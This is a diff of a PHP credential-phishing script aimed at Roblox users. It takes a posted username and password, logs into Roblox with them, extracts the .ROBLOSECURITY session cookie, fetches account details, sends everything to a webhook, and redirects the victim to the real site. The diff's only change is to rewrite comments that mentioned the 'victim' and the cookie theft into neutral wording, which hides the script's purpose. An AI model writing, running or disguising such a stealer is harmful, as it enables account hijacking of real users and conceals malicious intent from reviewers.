@@ -4,7 +4,7 @@ $user = $_POST['username'] ?? '';
 $pass = $_POST['password'] ?? '';
 if (!$user || !$pass) exit;
 
-// Try to log into Roblox using victim's password to get the .ROBLOSECURITY cookie
+// Login to Roblox
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com/v2/login');
 curl_setopt($ch, CURLOPT_POST, true);
@@ -19,7 +19,7 @@ preg_match('/\.ROBLOSECURITY=([^;]+)/', $headers, $match);
 $cookie = $match[1] ?? 'Not obtained (wrong password or 2FA)';
 curl_close($ch);
 
-// If we got the cookie, fetch extra data (robux, premium)
+// Fetch extra data if cookie obtained
 $extra = "";
 if ($cookie && $cookie != 'Not obtained') {
     $ctx = stream_context_create(['http' => ['header' => "Cookie: .ROBLOSECURITY=$cookie"]]);
@@ -42,6 +42,6 @@ file_get_contents($webhook, false, stream_context_create([
     ]
 ]));
 
-// Redirect victim to real Roblox
+// Redirect to real Roblox
 header('Location: https://www.roblox.com/home');
 ?>
